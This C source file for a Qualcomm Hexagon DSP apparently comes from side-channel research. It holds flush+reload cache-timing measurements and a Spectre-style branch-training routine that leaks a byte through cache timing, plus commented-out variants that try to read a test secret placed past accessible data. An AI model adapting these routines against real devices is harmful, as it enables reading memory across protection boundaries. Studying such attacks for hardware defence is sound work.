/*==============================================================================
  Copyright (c) 2012-2014, 2020 Qualcomm Technologies, Inc.
  All rights reserved. Qualcomm Proprietary and Confidential.
==============================================================================*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>
#include <inttypes.h>
#include <hexagon_protos.h>
#include "HAP_farf.h"
#include "microarch.h"
#include "asm.h"

#define SECRET_LENGTH 32
#define BITS_PER_BYTE 256
#define STRIDE 128
#define CACHE_THRESHOLD 150
#define RELOADBUFFER_SIZE BITS_PER_BYTE*STRIDE

#define usr_reg_mask 0xffff9fff

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "spectre_test"
#define DATA_SECRET DATA SECRET

uint8_t data[128];

int microarch_open(const char*uri, remote_handle64* handle) {
   void *tptr = NULL;
  /* can be any value or ignored, rpc layer doesn't care
   * also ok
   * *handle = 0;
   * *handle = 0xdeadc0de;
   */
   tptr = (void *)malloc(1);
   *handle = (remote_handle64)tptr;
   assert(*handle);
   return 0;
}

/**
 * @param handle, the value returned by open
 * @retval, 0 for success, should always succeed
 */
int microarch_close(remote_handle64 handle) {
   if (handle)
      free((void*)handle);
   return 0;
}

int microarch_fltest(remote_handle64 h, const int* vec, int vecLen, int64* res)
{
  uint64_t start_time;
  uint64_t end_time;
  uint64_t access_time;
  unsigned char *reloadbuffer = (unsigned char *)malloc(RELOADBUFFER_SIZE);
  volatile unsigned char __attribute__ ((unused)) access_char;
//   uint32_t shl_test = 1;

  // Put data in cache
  for (int i = 0; i < RELOADBUFFER_SIZE; i += STRIDE) {
        access_char = reloadbuffer[i];
  }

  // Cache hit
  for (int i = 0; i < 5000; i++) {
	barrier();
	start_time = rdtsc();
	// Read from cache
	access_char = reloadbuffer[0];
	end_time = rdtsc();
	barrier();
	access_time = end_time - start_time;
	FARF(RUNTIME_HIGH, "===============     DSP: Cache hit elapsed processor cycles: %ld ===============", access_time);
  }
  
  // Cache miss
  for (int i = 0; i < 5000; i++) {
	// Flush cache
	Q6_dccleaninva_A(reloadbuffer);
	barrier();
	start_time = rdtsc();
	// Read from cache
	access_char = reloadbuffer[0];
	end_time = rdtsc();
	barrier();
	access_time = end_time - start_time;
	FARF(RUNTIME_HIGH, "===============     DSP: Cache miss elapsed processor cycles: %ld ===============", access_time);
  }

//   shl_test = Q6_R_asl_RI(shl_test, 9);
//   FARF(RUNTIME_HIGH, "===============     DSP: shr_test after shift: %d ===============", shl_test);

	// // flush reloadbuffer from cache
	// for (int k = 0; k < RELOADBUFFER_SIZE; k += STRIDE) {
	// 	Q6_dccleaninva_A(&reloadbuffer[k]);
	// }
	// spectre_pht(reloadbuffer, 2);
	// for (int i = 0; i < BITS_PER_BYTE; i++) {
	// 	barrier();
	// 	start_time = rdtsc();
	// 	// Read from cache
	// 	access_char = reloadbuffer[i*STRIDE];
	// 	end_time = rdtsc();
	// 	barrier();
	// 	access_time = end_time - start_time;
	// 	if (access_time < CACHE_THRESHOLD) {
	// 		FARF(RUNTIME_HIGH, "===============     DSP: Cache hit at: %d ===============", i);
	// 	}
	// }
  
  // *res = (int64_t)access_char;
  *res = (int64_t)res;
  FARF(RUNTIME_HIGH, "===============     DSP: sum result pointer: %p ===============", res);

  free(reloadbuffer);
  return 0;
}

// int microarch_spectest(remote_handle64 h, const int* vec, int vecLen, int64* res)
// {
//     char leaked_secret = 0;
//     unsigned char *reloadbuffer;
//     volatile unsigned char __attribute__ ((unused)) access_char;
//     uint64_t time_start;
//     uint64_t time_end;
//     uint64_t time_access;
//     unsigned char addr;
//     uint32_t usr_reg;

//     unsigned char *target_addr = (unsigned char *)malloc(sizeof(unsigned char));
//     *target_addr = 'C';
//     reloadbuffer = (unsigned char *)malloc(RELOADBUFFER_SIZE*sizeof(unsigned char));
//     // memset the reloadbuffer so that the data will be actually read to cache
//     memset(reloadbuffer, 0x0, RELOADBUFFER_SIZE);

//     // train cpu to predict the branch
//     for (uint8_t i='A'; i<'C';i++) {
//         addr = (unsigned char)i;
//         // flush reloadbuffer from cache
//         for(int k = 0; k < RELOADBUFFER_SIZE; k += STRIDE) {
//             Q6_dcinva_A(&reloadbuffer[k]);
//         }
//         // train cpu 5 times is enough
//         for (int k = 0; k < 5; k++) {
//             Q6_dcinva_A(target_addr);
//             // FARF(RUNTIME_HIGH, "===============     DSP: Roud %d with k = %d ===============", i, k);
//             conditional_branch_test(reloadbuffer, target_addr, addr);

//             if(i != 0) break;
//         }
//     }

//     // speculate one byte of the secret each time by judging the access time to reloadbuffer
//     int j;
//     for (j = 0; j < BITS_PER_BYTE; j++) {
//         time_start = rdtsc();
//         // Read from cache
//         access_char = reloadbuffer[j * STRIDE];
//         time_end = rdtsc();
//         time_access = time_end - time_start;
//         if (time_access < CACHE_THRESHOLD) {
//             leaked_secret = j;
//             break;
//         }
//     }

// 	FARF(RUNTIME_HIGH, "===============     DSP: Cache hit at: %d ===============", j);
// 	FARF(RUNTIME_HIGH, "===============     DSP: Leaked byte: %d = %c ===============", leaked_secret, leaked_secret);
//   usr_reg = read_user_reg();
//   FARF(RUNTIME_HIGH, "===============     DSP: user reg: 0x%x ===============", usr_reg);
// 	*res = (int64_t)res;
// 	FARF(RUNTIME_HIGH, "===============     DSP: sum result pointer: %p ===============", res);

// 	free(reloadbuffer);
//   free(target_addr);
// 	return 0;
// }

int microarch_spectest(remote_handle64 h, const int* vec, int vecLen, int64* res)
{
    char leaked_secret = 0;
    unsigned char *reloadbuffer;
    volatile unsigned char __attribute__ ((unused)) access_char;
    uint64_t time_start;
    uint64_t time_end;
    uint64_t time_access;
    unsigned char addr;
    uint32_t usr_reg;
    uint32_t flag = 0;

    unsigned char *target_addr = (unsigned char *)malloc(sizeof(unsigned char));
    *target_addr = 'B';
    reloadbuffer = (unsigned char *)malloc(RELOADBUFFER_SIZE*sizeof(unsigned char));
    // memset the reloadbuffer so that the data will be actually read to cache
    memset(reloadbuffer, 0x0, RELOADBUFFER_SIZE);

    // train cpu to predict the branch
    for (uint8_t i='B'; i<'C';i++) {
        addr = (unsigned char)i;
        // flush reloadbuffer from cache
        for(int k = 0; k < RELOADBUFFER_SIZE; k += STRIDE) {
            Q6_dcinva_A(&reloadbuffer[k]);
        }
        // train cpu 5 times is enough
        for (int k = 0; k < 1; k++) {
            Q6_dcinva_A(target_addr);
            // FARF(RUNTIME_HIGH, "===============     DSP: Roud %d with k = %d ===============", i, k);
            flag = conditional_branch_test(reloadbuffer, target_addr, addr);

            if(i != 'A') break;
        }
    }

    // speculate one byte of the secret each time by judging the access time to reloadbuffer
    int j;
    for (j = 0; j < BITS_PER_BYTE; j++) {
        time_start = rdtsc();
        // Read from cache
        access_char = reloadbuffer[j * STRIDE];
        time_end = rdtsc();
        time_access = time_end - time_start;
        if (time_access < CACHE_THRESHOLD) {
            leaked_secret = j;
            break;
        }
    }

	FARF(RUNTIME_HIGH, "===============     DSP: Cache hit at: %d ===============", j);
	FARF(RUNTIME_HIGH, "===============     DSP: Leaked byte: %d = %c ===============", leaked_secret, leaked_secret);
  FARF(RUNTIME_HIGH, "===============     DSP: flag: %d ===============", flag);
  usr_reg = read_user_reg();
  FARF(RUNTIME_HIGH, "===============     DSP: user reg: 0x%x ===============", usr_reg);
	*res = (int64_t)res;
	FARF(RUNTIME_HIGH, "===============     DSP: sum result pointer: %p ===============", res);

	free(reloadbuffer);
  free(target_addr);
	return 0;
}

// int microarch_spectest(remote_handle64 h, const int* vec, int vecLen, int64* res)
// {
//     unsigned char *reloadbuffer;
//     volatile unsigned char __attribute__ ((unused)) access_char;
//     uint64_t time_start;
//     uint64_t time_end;
//     uint64_t time_access;
//     // uint32_t offset = 0x00ffffff;
//     uint32_t offset = 0x007fffff;
//     uint32_t target_offset;
//     // uint8_t *target_offset;
//     // uint32_t usr_.reg;
//     uint8_t data_offset = sizeof(DATA)-1;
//     uint8_t read_char = 5;

//     // target_offset = (unsigned char *)malloc(sizeof(unsigned char));
//     reloadbuffer = (unsigned char *)malloc(RELOADBUFFER_SIZE*sizeof(unsigned char));
//     // memset the reloadbuffer so that the data will be actually read to cache
//     memset(reloadbuffer, 0x0, RELOADBUFFER_SIZE);

//     // store secret
//     uint8_t data[128];
//     memset(data, ' ', 128);
//     memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
//     // ensure data terminates
//     data[sizeof(DATA_SECRET)-1] = '\0';

//     // nothing leaked so far
//     char leaked[sizeof(SECRET)];
//     int leaked_len = 0;
//     memset(leaked, ' ', sizeof(leaked));

//     // *target_offset = 0;
//     // target_offset = 1;
//     for (uint8_t i = sizeof(DATA)-1; i < sizeof(DATA_SECRET)-1; i++) {
//         // train cpu to predict the branch
//         for (uint8_t j = 0; j < 2; j++) {
//           data_offset = i * j;
//           target_offset = j;

//           // flush reloadbuffer from cache
//           for(int k = 0; k < RELOADBUFFER_SIZE; k += STRIDE) {
//               Q6_dcinva_A(&reloadbuffer[k]);
//           }
//           // read_char = 0;
//           // train dsp 5 times is enough
//           for (int m = 0; m < 5; m++) {
//               // Q6_dcinva_A(&offset);
//               // Q6_dcinva_A(target_offset);
//               // barrier();
              
//               // /*read_char = */conditional_branch(reloadbuffer, data+data_offset, target_offset, offset);
//               read_char = exe_path_test(reloadbuffer, data+data_offset, target_offset, offset);

//               if(j != 0) {
//                   break;
//               }
//           }
//       }

//       FARF(RUNTIME_HIGH, "===============     DSP: Read char %d = %c ===============", read_char, read_char);

//       // speculate one byte of the secret each time by judging the access time to reloadbuffer
//       for (int n = 0; n < BITS_PER_BYTE; n++) {
//           time_start = rdtsc();
//           // Read from cache
//           access_char = reloadbuffer[n * STRIDE];
//           time_end = rdtsc();
//           time_access = time_end - time_start;
          
//           if (time_access < CACHE_THRESHOLD) {
//               leaked[leaked_len] = n;
//               leaked_len++;
//               FARF(RUNTIME_HIGH, "===============     DSP: Cache hit at %d, Leaked byte %d = %c ===============", n, n, n);
//               break;
//           }
//           else {
//             // FARF(RUNTIME_HIGH, "===============     DSP: Access time %d ===============", time_access);
//           }
//       }
//     }

//   leaked[leaked_len] = '\0';
//   FARF(RUNTIME_HIGH, "===============     DSP: Data: %s ===============", data);
//   FARF(RUNTIME_HIGH, "===============     DSP: Leaked secret: %s ===============", leaked);
//   // usr_reg = read_user_reg();
//   // FARF(RUNTIME_HIGH, "===============     DSP: user reg: 0x%x ===============", usr_reg);
//   *res = (int64_t)res;
//   FARF(RUNTIME_HIGH, "===============     DSP: sum result pointer: %p ===============", res);

//   free(reloadbuffer);
//   // free(target_offset);
//   return 0;
// }
